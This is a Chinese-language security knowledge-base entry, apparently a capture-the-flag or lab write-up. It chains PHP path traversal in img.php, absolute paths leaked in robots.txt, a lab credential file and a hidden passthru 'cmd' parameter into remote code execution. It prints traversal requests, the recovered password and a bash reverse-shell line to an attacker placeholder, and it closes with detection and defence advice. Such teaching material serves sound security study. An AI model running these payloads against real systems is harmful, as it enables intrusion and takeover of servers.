---
id: web-php-file-inclusion-robots-absolute-path-credentials-comment-rce
title: robots.txt 绝对路径 + img.php LFI 读后台凭据，页面注释泄露 cmd 参数 RCE
type: scenario
domain: web
path: web/php/file-inclusion
technique: robots-absolute-path-lfi-credentials-comment-rce
tags:
- php
- lfi
- file-inclusion
- path-traversal
- robots
- credential-leak
- rce
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V282
  verified_at: '2026-11-08T05:01:36+08:00'
  notes: 已对照原文与截图核对 admin.holo.live/robots.txt 绝对路径、img.php file 参数 LFI、creds.txt 凭据、dashboard.php 注释 cmd/passthru 到 RCE；未验证点：LFI 底层函数原文未明确；dup-scan 无重复 pair，保留。
url: /docs/web/php/file-inclusion/web-php-file-inclusion-robots-absolute-path-credentials-comment-rce/
draft: false
kb_aliases:
- robots.txt 泄露绝对路径
- img.php file LFI
- 图片引用参数文件包含
- 注释泄露 cmd 参数
- passthru 命令执行
---

## 一句话结论

站点在 `talents.php` 用 `img.php?file=images/<name>.jpg` 引用图片，`file` 参数未过滤 `../` 形成 LFI；`admin.holo.live/robots.txt` 又直接列出 `/var/www/admin/supersecretdir/creds.txt` 等绝对路径，用 LFI 读取该文件得到后台账号 `admin:DBManagerLogin!` 并登录管理面板；面板源码注释中泄露了 `dashboard.php?cmd=` 的 `passthru` 逻辑，访问 `?cmd=ls` 即命令执行，最终反弹 shell 获取服务器立足点。

## 原理

- **图片引用参数可控**：`img.php?file=images/matsuri.jpg` 把 `file` 直接交给文件读取/包含函数；未做规范化与白名单，`images/../../../../../../etc/passwd` 可穿越到任意路径。若底层是 `include`/`readfile`/`file_get_contents`，均可读取任意文件；本例至少可任意文件读取。
- **robots.txt 泄露绝对路径**：`Disallow` 行常被运维用来“隐藏”敏感文件，但 robots.txt 本身公开，且本例直接写出服务器绝对路径（`/var/www/admin/supersecretdir/creds.txt`），等于给 LFI 提供了精确目标，无需猜目录。
- **凭据文件可读**：LFI 读取 `creds.txt` 得到 `admin:DBManagerLogin!`；同一个 robots 还泄露了 `db.php`、`dashboard.php`，帮助定位后台与源码。
- **注释泄露功能点**：登录后查看 `dashboard.php` 的页面源码/注释，发现类似 `//if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']); }` 的逻辑，暴露了隐藏的 `cmd` 参数与 `passthru` sink；`?cmd=ls` 验证成功。
- **为什么是完整链**：LFI 单独只能读文件，robots 单独只是信息泄露；两者结合把“任意文件读取”升级为“读取后台凭据 → 登录 → 发现命令执行参数 → RCE”，每一步都由前一步提供输入。

## 触发条件

- Web 应用存在用户可控的文件路径参数（LFI/任意文件读取），未限制目录穿越；
- robots.txt（或 sitemap、备份、注释、JS）泄露敏感文件的绝对路径；
- 泄露的文件中包含后台/数据库凭据，且账号可登录管理面板；
- 管理面板存在隐藏的命令执行参数（本例 `cmd` + `passthru`），或注释/源码泄露了该功能；
- Web 进程对敏感文件可读，且后台面板可访问。

## 利用步骤

1. 浏览 `dev.holo.live/talents.php`，发现图片链接 `img.php?file=images/matsuri.jpg`；尝试 `img.php?file=images/../../../../../../etc/passwd`，成功读取 `/etc/passwd` 确认 LFI。
2. 访问 `admin.holo.live/robots.txt`，记录：
   ```text
   Disallow: /var/www/admin/db.php
   Disallow: /var/www/admin/dashboard.php
   Disallow: /var/www/admin/supersecretdir/creds.txt
   ```
3. 用 LFI 读取 `creds.txt`：`img.php?file=images/../../../../../../var/www/admin/supersecretdir/creds.txt`，得到 `admin:DBManagerLogin!`（并注意到用户名 `gurag`）。
4. 用该凭据登录 `admin.holo.live` 后台；查看 `dashboard.php` 页面源码/注释，发现 `cmd` 参数与 `passthru` 逻辑。
5. 访问 `http://admin.holo.live/dashboard.php?cmd=ls` 验证命令执行；构造反弹 shell：
   ```text
   dashboard.php?cmd=bash -c 'bash -i >& /dev/tcp/<attacker>/<port> 0>&1'
   ```
6. 稳定 shell（`python3 -c 'import pty;pty.spawn("/bin/bash")'`、`stty raw -echo; fg`），在 `/var/www` 读取 user flag。

## PoC

```http
GET /img.php?file=images/../../../../../../etc/passwd HTTP/1.1
Host: dev.holo.live
```

```http
GET /robots.txt HTTP/1.1
Host: admin.holo.live

User-agent: *
Disallow: /var/www/admin/db.php
Disallow: /var/www/admin/dashboard.php
Disallow: /var/www/admin/supersecretdir/creds.txt
```

```http
GET /img.php?file=images/../../../../../../var/www/admin/supersecretdir/creds.txt HTTP/1.1
Host: dev.holo.live
# admin:DBManagerLogin!
```

```http
GET /dashboard.php?cmd=ls HTTP/1.1
Host: admin.holo.live
Cookie: PHPSESSID=<登录会话>
```

## 变体与关联

- **变体**：LFI 可升级为 RCE：日志包含（User-Agent 写 PHP）、`/proc/self/environ`、session 文件包含、php://filter 读源码、`data://`/`php://input`（若 allow_url_include）。
- **变体**：robots.txt 换成 sitemap.xml、备份文件、`.git`、JS source map、HTML 注释、错误页泄露绝对路径；凭据文件换成 `.env`、`config.php`、`wp-config.php`、SSH key。
- **变体**：后台命令执行参数可能叫 `cmd`/`exec`/`ping`/`debug`，sink 可能是 `system`/`exec`/`shell_exec`/`passthru`；注释、JS、接口文档都可能泄露。
- **关联**：[[web-php-file-inclusion-manage-file-param-wfuzz-traversal]]（wfuzz 爆破 LFI 参数）、[[pentest-recon-web-config-robots-credential-leak]]（robots/config 泄露凭据）、[[web-php-file-inclusion-access-log-poisoning-webshell]]（LFI 日志包含 getshell）、[[web-php-rce-shell-exec-quote-concat-glob-flag]]（PHP 命令执行绕过）、[[web-generic-file-inclusion-windows-sam-ntlm-crack]]（LFI 读 SAM）。

## 检测与防御

- **输入校验**：文件参数使用固定映射/白名单（只允许 `images/` 下的已知文件名），`basename` + 扩展名校验 + `realpath` 确认最终路径在允许目录内；禁止 `../`、绝对路径、`php://` 等包装器。
- **最小暴露**：robots.txt 不写服务器绝对路径与敏感文件名；敏感凭据不放在 Web 可读目录，配置文件权限最小化；生产环境关闭源码/注释中的调试与命令执行代码。
- **后台加固**：管理面板强口令 + MFA、限制来源 IP；移除 `cmd` 等危险参数；对所有命令执行接口做白名单与审计。
- **检测**：Web 日志中出现大量 `../`、`/etc/passwd`、`php://filter`、绝对路径参数；同一 IP 先 LFI 读 `creds.txt` 后登录后台再访问 `?cmd=` 的行为链；WAF 对路径穿越与 `passthru` 关键字告警。
- **响应**：发现 LFI 立即修复参数校验、轮换泄露凭据、检查 Web 目录是否被写入 WebShell、审计后台命令执行记录与出站连接。
